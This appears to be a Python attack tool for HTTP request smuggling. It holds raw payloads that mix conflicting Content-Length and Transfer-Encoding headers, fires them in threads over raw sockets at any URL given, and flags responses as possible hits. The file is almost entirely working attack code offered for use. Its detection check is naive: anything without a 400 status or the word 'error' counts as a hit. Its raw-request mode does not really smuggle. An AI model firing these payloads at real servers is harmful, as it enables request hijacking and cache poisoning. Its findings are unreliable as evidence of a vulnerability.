#!/usr/bin/env python3

import argparse
import threading
import time
import sys
import requests
import socket
import ssl
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

BANNER = f"""{Fore.CYAN}
╔══════════════════════════════════════════════╗
║      Advanced HTTP Request Smuggling Tool     ║
╚══════════════════════════════════════════════╝
"""

PAYLOADS = [
    ("CL.TE", "Content-Length + Transfer-Encoding mismatch", "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
    ("TE.CL", "Transfer-Encoding + Content-Length mismatch", "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nG"),
    ("CL.0", "Content-Length set to 0", "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nG"),
    ("TE..", "Double dot in Transfer-Encoding header", "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked..gzip\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG"),
    ("Space_TE", "Space after Transfer-Encoding header", "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding : chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG"),
    ("Dup_CL", "Duplicate Content-Length headers", "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG"),
    ("TE_TE", "Double Transfer-Encoding headers", "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: gzip\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG"),
]

def parse_args():
    parser = argparse.ArgumentParser(description="Advanced HTTP Request Smuggling Tester")
    parser.add_argument("--url", help="Target URL (e.g., https://example.com)", required=False)
    parser.add_argument("--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)", required=False)
    parser.add_argument("--threads", help="Number of threads", type=int, default=5)
    parser.add_argument("--verbose", help="Verbose mode explaining each attack", action="store_true")
    parser.add_argument("--follow-redirects", help="Follow redirects", action="store_true")
    parser.add_argument("--raw-request", help="Path to raw request file", required=False)
    parser.add_argument("--timeout", help="Request timeout", type=int, default=10)
    parser.add_argument("--rate-limit", help="Delay between requests in seconds", type=float, default=0.5)
    parser.add_argument("--exit-on-found", help="Exit after first vulnerability found", action="store_true")
    return parser.parse_args()

def send_raw_socket(host, port, raw_data, use_ssl):
    try:
        s = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=host)
        s.sendall(raw_data.encode())
        response = s.recv(4096)
        return response.decode(errors="ignore")
    except Exception as e:
        return str(e)

def attack_payload(args, payload_info):
    method, description, payload_template = payload_info
    try:
        parsed = urlparse(args.url)
        host = parsed.netloc
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        raw_payload = payload_template.format(host=host)

        if args.verbose:
            print(f"{Fore.BLUE}[INFO] Trying {method}: {description}")

        response = send_raw_socket(host, port, raw_payload, use_ssl)

        if "HTTP/1.1 400" not in response and "error" not in response.lower():
            print(f"{Fore.GREEN}[+] {method} smuggling attempt seems interesting!")
            print(f"{Fore.YELLOW}{response.splitlines()[0]}")
            if args.exit_on_found:
                sys.exit(0)
        else:
            print(f"{Fore.RED}[-] {method} not successful.")

        time.sleep(args.rate_limit)
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")

def attack_with_requests(args):
    try:
        headers = {}
        if args.proxy:
            proxies = {"http": args.proxy, "https": args.proxy}
        else:
            proxies = None

        if args.raw_request:
            with open(args.raw_request, "r") as f:
                raw = f.read()
            method, path, _ = raw.splitlines()[0].split()
            body = raw.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in raw else ""

            if args.verbose:
                print(f"{Fore.BLUE}[INFO] Sending custom raw request from file...")

            parsed = urlparse(args.url)
            conn = requests.Session()
            conn.proxies.update(proxies if proxies else {})
            response = conn.request(method, args.url + path, data=body, headers=headers, allow_redirects=args.follow_redirects, timeout=args.timeout)
            
            if response.status_code >= 400:
                print(f"{Fore.RED}[-] Raw request returned status: {response.status_code}")
            else:
                print(f"{Fore.GREEN}[+] Raw request successful: {response.status_code}")
        else:
            print(f"{Fore.RED}[!] No raw request provided!")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")

def main():
    print(BANNER)
    args = parse_args()

    if not args.url and not args.raw_request:
        print(f"{Fore.RED}[!] URL or Raw Request file must be provided!")
        sys.exit(1)

    jobs = []

    if args.raw_request:
        t = threading.Thread(target=attack_with_requests, args=(args,))
        jobs.append(t)
    else:
        for payload_info in PAYLOADS:
            t = threading.Thread(target=attack_payload, args=(args, payload_info))
            jobs.append(t)

    for job in jobs:
        job.start()
        time.sleep(args.rate_limit / 2)  # Slight stagger to reduce blast

    for job in jobs:
        job.join()

if __name__ == "__main__":
    main()
